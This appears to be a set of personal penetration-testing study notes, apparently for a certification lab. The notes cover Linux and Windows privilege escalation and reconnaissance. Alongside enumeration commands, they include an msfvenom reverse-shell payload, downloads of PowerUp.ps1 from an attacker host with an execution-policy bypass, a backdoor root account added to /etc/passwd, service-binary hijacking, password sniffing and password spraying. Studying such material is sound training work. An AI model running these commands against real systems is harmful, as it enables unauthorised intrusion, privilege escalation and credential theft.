+
+<a id="cpts-privesc-ssh-keys-9d5895fc--create-new-ssh-keys"></a>
+
+### Create new SSH Keys
+
+Can be done if there is no ssh keys present in the user home directory
+
+```bash
+ssh-keygen -f key
+```
+(-f flag is to specifically output the file)
+
+
+---
+
+<a id="cpts-privesc-scripts-c4d7f139"></a>
+
+<a id="cpts-privesc-scripts-c4d7f139--scripts"></a>
+
+# Scripts
+
+Linpeas
+LinEnum
+linuxprivchecker
+linux-exploit-suggester
+
+Winpeas
+Seatbelt
+Jaws
+
+
+*Remember to store all these in OPT folder of base kali* abcd
+
+
+---
+
+<a id="cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6"></a>
+
+<a id="cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6--service-binary-hijacking-macbook-pro"></a>
+
+# Service Binary Hijacking-MacBook Pro
+
+
+Get a list of all installed windows services
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+Check permissions on a binary
+```powershell
+icacls "C:\xampp\apache\bin\httpd.exe"
+```
+
+Stopping a service
+```powershell
+net stop mysql
+```
+
+Check if service starts on boot
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+#if the service is set to auto check privileges
+whoami /priv
+
+#if SeShutDownPrivilege
+shutdown /r /t 0
+```
+
+Use PowerUp.ps1 to check for modifiable service files
+```powershell
+iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+
+#if the file is directly abusable we can just run this
+Install-ServiceBinary -Name 'mysql'
+#this will create a user john:Password123! and add to local administrator group. However, do rememeber to further manually en
+```
+
+
+---
+
+<a id="cpts-privesc-user-privileges-db86feff"></a>
+
+<a id="cpts-privesc-user-privileges-db86feff--user-privileges"></a>
+
+# User Privileges
+
+
+Check for what sudo privileges we have
+```bash
+sudo -l
+```
+
+Check if we can change to root (if lucky)
+```bash
+sudo su -
+```
+
+Running sudo as another user
+```bash
+vernonlim03@htb[/htb]$ sudo -u user /bin/echo Hello World!
+
+    Hello World!
+```
+
+Change user command
+```bash
+sudo -su user2
+```
+
+<a id="cpts-privesc-user-privileges-db86feff--gtfobins"></a>
+
+#### GTFOBins
+
+If there is a service that is capable of running as the root user, check GTFOBins for it
+<https://gtfobins.github.io/>
+
+
+<a id="cpts-privesc-user-privileges-db86feff--lolbas"></a>
+
+#### LOLBAS
+
+Contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user
+<https://lolbas-project.github.io/#>
+
+
+---
+
+<a id="cpts-privesc-vulnerable-software-0b603bf7"></a>
+
+<a id="cpts-privesc-vulnerable-software-0b603bf7--vulnerable-software"></a>
+
+# Vulnerable Software
+
+Look for software installed in the victim machine which could potentially be vulnerable
+
+For Linux:
+```bash
+dpkg -l
+```
+
+For Windows:
+```cmd
+C:\Program Files
+```
+
+
+
+---
+
+<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87"></a>
+
+<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87--crontabs-scheduled-tasks"></a>
+
+# Crontabs (Scheduled Tasks)
+
+
+1. Add new scheduled tasks/cron jobs
+2. Trick them to execute a malicious software
+
+Check if we have write privileges on these directories
+```bash
+ls -al /etc/cron*
+
+crontab -l
+
+cat /etc/crontab
+ls -al /etc/cron.d
+cat /var/spool/cron/crontabs/root
+
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+```
+
+Inspect cron log file for running cron jobs
+```bash
+grep "CRON" /var/log/syslog
+```
+
+Use pspy to do a live monitoring of running processes
+```bash
+./pspy32
+(rmb to look at the uid to see who is running the command uid=0 is root)
+
+./pspy64 -pf -i 1000
+#(The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second))
+```
+<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87--remember-to-cat-and-ls-al-sus-cron-jobs"></a>
+
+## REMEMBER to cat and ls -al sus cron jobs 
+
+If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
+
+
+
+
+---
+
+<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6"></a>
+
+<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6--exposed-confidential-info"></a>
+
+# Exposed Confidential Info
+
+
+Check environment variables
+```bash
+env
+```
+
+Display bash history in user home directories
+```bash
+cat .bashrc
+```
+
+Harvest active processes for credentials
+```bash
+watch -n 1 "ps -aux | grep pass"
+```
+(might need to wait a couple of seconds/minutes)
+
+Tcpdump to conduct password sniffing on sockets
+```bash
+sudo tcpdump -i lo -A | grep "pass"
+```
+(might need to wait a couple of seconds/minutes)
+
+Finding config files
+```shell
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+```
+
+Command to look for ssh private keys
+```shell
+ls ~/.ssh
+```
+
+
+
+<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6--wordpress-config-file-might-contain-mysql-creds-so-be-a-lookout-for-wp-configphp-use-the-command-to-fish-for-the-mysql-creds"></a>
+
+#### Wordpress config file MIGHT contain mysql creds so be a lookout for wp-config.php (use the command to fish for the MYSQL creds)
+```shell
+grep 'DB_USER\|DB_PASSWORD' wp-config.php
+```
+
+
+---
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016"></a>
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--methodology-checklist"></a>
+
+# Methodology Checklist
+
+
+1. Simple Manual Enumeration
+2. SUDO Privileges
+3. Privileged Groups
+4. Check Write Perms to /etc/passwd
+5. Check Crontabs (Scheduled Tasks)
+6. SUID
+7. Path abuse
+8. Wildcard Abuse
+9. Check Running Processes (ps -aux) / pspy64
+10. Check for Vulnerable software
+11. Use linpeas/unix-privesc-check
+12. Credential hunting
+
+---
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--simple-manual-enumeration"></a>
+
+## Simple Manual Enumeration
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--get-logged-in-username"></a>
+
+### Get logged in username
+```bash
+whoami
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--get-id-of-logged-in-user"></a>
+
+### Get id of logged in user
+```bash
+id
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--enumerate-users-on-the-system"></a>
+
+### Enumerate users on the system
+```bash
+cat /etc/passwd
+ls -al /etc/passwd
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--check-hostname"></a>
+
+### Check Hostname
+```bash
+hostname
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--operating-system-release-and-version"></a>
+
+### Operating system release and version
+```bash
+cat /etc/issue
+cat /etc/os-release
+uname -a
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--enumerate-system-processes"></a>
+
+### Enumerate system processes
+```bash
+ps aux
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--look-at-ip"></a>
+
+### Look at ip
+```bash
+ifconfig
+ip a
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--look-at-all-active-connections"></a>
+
+### Look at all active connections
+```bash
+ss -anp
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-writable-directories"></a>
+
+### Find writable directories
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--check-mounted-filesystems-and-available-disks"></a>
+
+### Check mounted filesystems and available disks
+```bash
+cat /etc/fstab
+mount
+lsblk
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--finding-history-files"></a>
+
+### Finding History Files
+```shell
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-running-proc"></a>
+
+### Find running proc
+```shell
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--installed-packages"></a>
+
+### Installed packages
+```shell
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--binaries"></a>
+
+### Binaries
+```shell
+ls -l /bin /usr/bin/ /usr/sbin/
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--automated-gtfobins-checker"></a>
+
+### Automated GTFOBINS checker
+```shell
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--trace-system-calls"></a>
+
+### Trace system calls
+```shell
+strace ping -c1 10.129.112.20
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-config-files"></a>
+
+### Find config files
+```shell
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+```
+
+<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-scripts"></a>
+
+### Find scripts
+```shell
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+```
+
+
+---
+
+<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb"></a>
+
+<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb--os-and-kernel-exploits"></a>
+
+# OS and Kernel Exploits
+
+Check operating system version number using searchsploit or google
+
+```bash
+uname -a
+cat /etc/os-release
+cat /etc/issue
+arch
+
+searchsploit 3.9.0-73-generic
+```
+
+<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb--can-check-linpeas-as-well"></a>
+
+## Can check linpeas as well
+
+
+---
+
+<a id="cpts-privesc-linux-path-abuse-b5a507cc"></a>
+
+<a id="cpts-privesc-linux-path-abuse-b5a507cc--path-abuse"></a>
+
+# Path Abuse
+
+
+<a id="cpts-privesc-linux-path-abuse-b5a507cc--echo-the-path-and-check-for-any-sus-directories-in-the-path"></a>
+
+### Echo the path and check for any sus directories in the path
+```shell
+echo $PATH
+```
+
+Next check if we can modify the path environment variable, if yes we can exploit this
+```shell
+PATH=.:${PATH}
+export PATH
+echo $PATH
+
+# make a new file in the current directory like ls and put malicious content
+touch ls
+echo 'echo "PATH ABUSE!!"' > ls
+chmod +x ls
+ls
+```
+
+
+---
+
+<a id="cpts-privesc-linux-suid-sticky-bit-a4af3b7a"></a>
+
+<a id="cpts-privesc-linux-suid-sticky-bit-a4af3b7a--suid-sticky-bit"></a>
+
+# SUID Sticky Bit
+
+
+Look for sticky bit commands
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+Suspicious binary with the flag hiding inside
+```bash
+strings /usr/bin/passwd_flag
+cat /usr/bin/passwd_flag
+```
+
+If not then go https://gtfobins.github.io/
+
+
+
+
+Enumerate capabilities using getcap
+```bash
+/usr/sbin/getcap -r / 2>/dev/null
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+![Pasted image 20250529150333.png](cpts/assets/Pasted%20image%2020250529150333.png)
+
+If there are any sus binaries just search https://gtfobins.github.io/
+
+
+
+---
+
+<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403"></a>
+
+<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--write-perms-to-etc-passwd"></a>
+
+# Write perms to etc passwd
+
+
+<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--try-to-remove-the-x-in-the-root-password-first"></a>
+
+## Try to remove the x in the root password first
+
+<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--try-adding-new-user-instead-if-the-above-doesnt-succeed"></a>
+
+## Try adding new user instead if the above doesn't succeed
+
+```bash
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+
+
+---
+
+<a id="cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f"></a>
+
+<a id="cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f--admin-user-with-no-admin-privileges"></a>
+
+# Admin user with no admin privileges
+
+- Bypass UAC 
+
+
+---
+
+<a id="cpts-privesc-windows-dll-hijacking-3a400c32"></a>
+
+<a id="cpts-privesc-windows-dll-hijacking-3a400c32--dll-hijacking"></a>
+
+# DLL Hijacking
+
+
+<a id="cpts-privesc-windows-dll-hijacking-3a400c32--dll-search-order-for-windows-machines-safedll-search"></a>
+
+##### DLL Search order for Windows Machines (SafeDLL Search)
+```
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+```
+
+Get a list of installed applications
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+Search up google/searchsploit for potential sus programs for DLL hijacking
+
+Check for write privileges in the programs directories (just echo txt file)
+
+
+---
+
+<a id="cpts-privesc-windows-exposed-credentials-09889ee3"></a>
+
+<a id="cpts-privesc-windows-exposed-credentials-09889ee3--exposed-credentials"></a>
+
+# Exposed Credentials
+
+
+```
+history (linux)
+
+PSReadLine (Windows)
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+type history.txt
+```
+
+<a id="cpts-privesc-windows-exposed-credentials-09889ee3--windows"></a>
+
+#### Windows
+```powershell
+#Search for stored passwords
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+```cmd
+findstr /si password *.txt *.ini *.config*
+```
+
+
+
+---
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143"></a>
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--methodology-checklist"></a>
+
+# Methodology Checklist
+
+
+1. Vulnerable programs
+2. SeimpersonatePrivilege
+3. Unquoted Service Path
+4. Service Binary Hijacking
+5. DLL hijacking
+6. Scheduled tasks
+7. Mimikatz/Winpeas
+
+
+---
+<a id="cpts-privesc-windows-methodology-checklist-32314143--manual-enumeration"></a>
+
+## Manual Enumeration
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--get-system-information"></a>
+
+### Get System Information
+```cmd
+systeminfo
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--check-hostname"></a>
+
+### Check Hostname
+```cmd
+hostname
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--patches-already-implemented-on-system"></a>
+
+### Patches already implemented on system
+```cmd
+wmic qfe
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+wmic logicaldisk get caption,description,providername
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--check-whoami-and-privileges-that-we-have"></a>
+
+### Check whoami and privileges that we have
+```cmd
+whoami
+whoami /priv
+whoami /groups
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-for-existing-user-accounts"></a>
+
+### Enumerate for existing user accounts
+```cmd
+net user
+net user bob
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-groups"></a>
+
+### Enumerate Groups
+```cmd
+net localgroup
+net localgroup administrators
+```
+
+<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-exposed-credentials"></a>
+
+### Enumerate exposed credentials
+
+import-module .\PowerView.ps1\
+
+
+---
+
+<a id="cpts-privesc-windows-scheduled-tasks-2dc078d8"></a>
+
+<a id="cpts-privesc-windows-scheduled-tasks-2dc078d8--scheduled-tasks"></a>
+
+# Scheduled Tasks
+
+Get a list of all the scheduled tasks on the system
+```powershell
+schtasks /query /fo LIST /v
+```
+
+Use icacls to check permissions on the executable
+```powershell
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+```
+
+Then just msfvenom to create the reverse shell and upload it as the new executable
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe -o reverse.exe
+```
+
+
+---
+
+<a id="cpts-privesc-windows-service-binary-hijacking-ada39c1a"></a>
+
+<a id="cpts-privesc-windows-service-binary-hijacking-ada39c1a--service-binary-hijacking"></a>
+
+# Service Binary Hijacking
+
+
+Get a list of all installed windows services
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,Startname,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+Check permissions on a binary
+```powershell
+icacls "C:\xampp\apache\bin\httpd.exe"
+```
+
+Stopping a service
+```powershell
+net stop mysql
+```
+
+Check if service starts on boot
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+#if the service is set to auto check privileges
+whoami /priv
+
+# RMB TO MOVE THE SERVICE FILE OUT FIRST BEFORE MOVING THE REVSHELL IN
+PS C:\Users\Public> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+PS C:\Users\Public> move reverse.exe C:\xampp\mysql\bin\mysqld.exe
+
+#if SeShutDownPrivilege
+shutdown /r /t 0
+```
+
+Use PowerUp.ps1 to check for modifiable service files
+```powershell
+iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-AllChecks
+Get-ModifiableServiceFile
+
+
+#if the file is directly abusable we can just run this
+Install-ServiceBinary -Name 'mysql'
+#this will create a user john:Password123! and add to local administrator group. However, do rememeber to further manually enumerate as this is not 100%.
+```
+
+Use sc.exe in powershell to start/stop a service
+```powershell
+sc.exe qc auditTracker
+
+sc.exe start auditTracker
+sc.exe stop auditTracker
+```
+
+
+---
+
+<a id="cpts-privesc-windows-services-automatically-started-on-boot-769440ef"></a>
+
+<a id="cpts-privesc-windows-services-automatically-started-on-boot-769440ef--services-automatically-started-on-boot"></a>
+
+# Services Automatically Started on Boot
+
+
+Trial command
+
+```cmd
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" 
+|findstr /i /v "c:\windows\\" |findstr /i /v """ 
+```
+
+
+---
+
+<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0"></a>
+
+<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0--unquoted-service-paths"></a>
+
+# Unquoted Service Paths
+
+Look out for sus programs that have spaces in their directory
+
+The terminal looks for the executable is this sequence
+```cmd
+C:\Program.exe
+C:\Program Files\A.exe
+C:\Program Files\A Files\B.exe
+
+net stop service
+net start service
+
+#only if above is not possible then check for reboot perms
+shutdown /r /t 0
+```
+
+Checking for write privileges to a folder
+```cmd
+icacls C:\Users\nur
+```
+
+Find possible unquoted service paths
+```cmd
+wmic service get name,pathname,displayname,startmode |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+(RUN IN CMD ONLY)
+
+<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0--powerupps1"></a>
+
+#### PowerUp.ps1
+```powershell
+iwr http://192.168.45.202/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+
+# auto exploit creating user john:Password123!
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+```
+
+
+---
+
+<a id="cpts-reconnaissance-ad-reconnaissance-cbb23af1"></a>
+
+<a id="cpts-reconnaissance-ad-reconnaissance-cbb23af1--ad-reconnaissance"></a>
+
+# AD Reconnaissance
+
+
+Wireshark
+```shell-session
+sudo -E wireshark
+```
+
+Tcpdump
+```shell-session
+sudo tcpdump -i ens224
+```
+
+Responder
+```bash
+sudo responder -I ens224 -A 
+```
+
+Fping active checks
+```shell-session
+fping -asgq 172.16.5.0/23
+```
+
+Internal AD username enumeration
+```shell-session
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+```
+
+
+
+---
+
+<a id="cpts-reconnaissance-cloud-resources-836ba495"></a>
+
+<a id="cpts-reconnaissance-cloud-resources-836ba495--cloud-resources"></a>
+
+# Cloud Resources
+
+Use `inurl:` and `intext`: to search for possible cloud domains owned by the company
+![Pasted image 20250326172013.png](cpts/assets/Pasted%20image%2020250326172013.png)
+<a id="cpts-reconnaissance-cloud-resources-836ba495--check-main-websites-source-code-for-potential-hrefs"></a>
+
+#### Check main website's source code for potential hrefs
+![Pasted image 20250326173144.png](cpts/assets/Pasted%20image%2020250326173144.png)
+
+<a id="cpts-reconnaissance-cloud-resources-836ba495--online-tools"></a>
+
+#### Online Tools
+- https://domain.glass/
+- https://buckets.grayhatwarfare.com/
+
+
+---
+
+<a id="cpts-reconnaissance-domain-discovery-d1213c29"></a>
+
+<a id="cpts-reconnaissance-domain-discovery-d1213c29--domain-discovery"></a>
+
+# Domain Discovery
+
+1. Check SSL Certificate of Company's main website
+2. Use https://crt.sh to look up for subdomains
+
+<a id="cpts-reconnaissance-domain-discovery-d1213c29--curl"></a>
+
+#### CURL
+```bash
+curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
+```
+```bash
+for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
+```
+(checks which domains are accessible on the internet)
+
+<a id="cpts-reconnaissance-domain-discovery-d1213c29--shodan"></a>
+
+#### Shodan
+```shell
+vernonlim03@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
+vernonlim03@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done
+```
+
+<a id="cpts-reconnaissance-domain-discovery-d1213c29--checking-dns-records"></a>
+
+#### Checking DNS Records
+```shell
+dig any inlanefreight.com
+```
+
+
+---
+
+<a id="cpts-reconnaissance-host-discovery-a202aa9e"></a>
+
+<a id="cpts-reconnaissance-host-discovery-a202aa9e--host-discovery"></a>
+
+# Host Discovery
+
+nmap
+```bash
+sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
+```
+
+
+
+---
+
+<a id="cpts-reconnaissance-password-hunting-d3163f7e"></a>
+
+<a id="cpts-reconnaissance-password-hunting-d3163f7e--password-hunting"></a>
+
+# Password Hunting
+
+<a id="cpts-reconnaissance-password-hunting-d3163f7e--cewl-generate-passwords-on-a-website"></a>
+
+### CeWL (generate passwords on a website)
+
+```shell
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+wc -l inlane.wordlist
+```
+
+- -d  (to specify the depth to spider)
+- -m (to specify minimum length of the word)
+- -w (store results where)
+
+<a id="cpts-reconnaissance-password-hunting-d3163f7e--hashcat-mutate-passwords-based-on-custom-rule"></a>
+
+## HashCat (mutate passwords based on custom rule)
+
+```shell
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+```
+
+
+
+<a id="cpts-reconnaissance-password-hunting-d3163f7e--default-credentials-csv-dump"></a>
+
+## Default Credentials - CSV DUMP
+<https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv>
+
+
+---
+
+<a id="cpts-reconnaissance-username-discovery-3e712759"></a>
+
+<a id="cpts-reconnaissance-username-discovery-3e712759--username-discovery"></a>
+
+# Username Discovery
+
+
+<a id="cpts-reconnaissance-username-discovery-3e712759--common-username-conventions"></a>
+
+### Common Username conventions
+![Pasted image 20250429140747.png](cpts/assets/Pasted%20image%2020250429140747.png)
+
+<a id="cpts-reconnaissance-username-discovery-3e712759--use-username-anarchy-to-create-a-possible-list"></a>
+
+### Use Username Anarchy to create a possible list
+```shell
+./cpts-tools/username-anarchy/username-anarchy -i /home/ltnbob/names.txt 
+```
+
+Then spray it with netexec
+```shell
+netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+
+
+---
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9"></a>
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--web-reconnaissance"></a>
+
+# Web Reconnaissance
+
+
+| Technique               | Description                                                                 | Example                                                                                                      | Tools                                                                 | Risk of Detection                                                                 |
+|-------------------------|-----------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|-----------------------------------------------------------------------------------|
+| Port Scanning           | Identifying open ports and services running on the target.                  | Using Nmap to scan a web server for open ports like 80 (HTTP) and 443 (HTTPS).                               | Nmap, Masscan, Unicornscan                                           | High: Direct interaction with the target can trigger intrusion detection systems (IDS) and firewalls. |
+| Vulnerability Scanning  | Probing for known vulnerabilities (outdated software/misconfigurations).    | Running Nessus against a web app to check for SQLi/XSS flaws.                                                | Nessus, OpenVAS, Nikto                                               | High: Exploit payloads may trigger security solutions.                            |
+| Network Mapping         | Mapping network topology and device relationships.                          | Using traceroute to reveal network hops and infrastructure.                                                  | Traceroute, Nmap                                                     | Medium-High: Unusual traffic patterns may raise suspicion.                        |
+| Banner Grabbing         | Retrieving service banner information.                                      | Connecting to port 80 to identify web server software/version.                                               | Netcat, curl                                                         | Low: Minimal interaction but may be logged.                                       |
+| OS Fingerprinting       | Identifying the target's operating system.                                  | Using Nmap's -O flag to detect Windows/Linux.                                                                | Nmap, Xprobe2                                                        | Low: Generally passive, but advanced techniques may be detected.                  |
+| Service Enumeration     | Determining specific service versions.                                      | Using Nmap's -sV to check for Apache 2.4.50/Nginx 1.18.0.                                                    | Nmap                                                                 | Low: Similar risk to banner grabbing.                                             |
+| Web Spidering           | Crawling websites to discover pages/directories.                            | Using Burp Suite Spider to map website structure.                                                             | Burp Suite, OWASP ZAP, Scrapy                                        | Low-Medium: May trigger alerts if not mimicking human traffic.                    |
+| Search Engine Queries   | Using search engines to uncover public target information.                  | Google searching "[Target] employees" for social media profiles.                                              | Google, DuckDuckGo, Shodan                                           | Very Low: Normal internet activity.                                               |
+| WHOIS Lookups           | Retrieving domain registration details.                                     | Checking WHOIS records for registrant contact info.                                                           | whois command, online lookup services                                | Very Low: Legitimate DNS activity.                                                |
+| DNS Analysis            | Examining DNS records for subdomains/infrastructure.                        | Using dig to enumerate target subdomains.                                                                     | dig, nslookup, dnsrecon                                              | Very Low: Essential internet function.                                            |
+| Web Archive Analysis    | Reviewing historical website snapshots.                                     | Using Wayback Machine to find deleted pages.                                                                  | Wayback Machine                                                       | Very Low: Public archive access.                                                  |
+| Social Media Analysis   | Gathering info from platforms like LinkedIn/Twitter.                        | Searching LinkedIn for employee roles/responsibilities.                                                       | LinkedIn, Twitter, OSINT tools                                       | Very Low: Public profile viewing.                                                 |
+| Code Repository Analysis| Checking public repos for exposed data.                                     | Searching GitHub for target-related code/credentials.                                                         | GitHub, GitLab                                                       | Very Low: Normal repository browsing.                                             |
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--whois"></a>
+
+### WHOIS
+
+```
+whois inlanefreight.com
+```
+
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--dns-analysis"></a>
+
+### DNS Analysis
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--dig-command"></a>
+
+###### DIG Command
+```bash
+#regular
+dig google.com
+
+#ptr record
+dig -x google.com
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--subdomain-enumeration"></a>
+
+###### Subdomain Enumeration
+
+- DNS Zone Transfer
+- Subdomain Brute Forcing
+- Certificate Transparency (CT) Logs
+- Search Engines (rmb to add site: )
+
+```bash
+dig axfr inlanefreight.htb @10.129.14.128
+dig axfr internal.inlanefreight.htb @10.129.14.128
+```
+
+```bash
+dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
+gobuster dns -d inlanefreight.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--virtual-host-discovery"></a>
+
+###### Virtual Host Discovery
+
+- RMB if this doesnt work it could be an entry needs to be added in /etc/hosts
+
+```shell
+gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--ct-logs"></a>
+
+###### CT Logs
+<https://crt.sh>
+
+- This command fetches the JSON output from crt.sh for certificates matching the domain facebook.com
+- jq -r '.[] | select(.name_value | contains("dev")) | .name_value': This part filters the JSON results, selecting only entries where the name_value field (which contains the domain or subdomain) includes the string "dev". The -r flag tells jq to output raw strings.
+- sort -u: This sorts the results alphabetically and removes duplicates.
+
+```shell
+curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
+ | select(.name_value | contains("dev")) | .name_value' | sort -u
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--fingerprinting"></a>
+
+#### Fingerprinting
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--banner-grabbing"></a>
+
+###### Banner Grabbing
+```bash
+curl -I inlanefreight.com
+```
+
+<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--wafw00f"></a>
+
+###### Wafw00f
+- Detect the precense of a WAF
+```shell
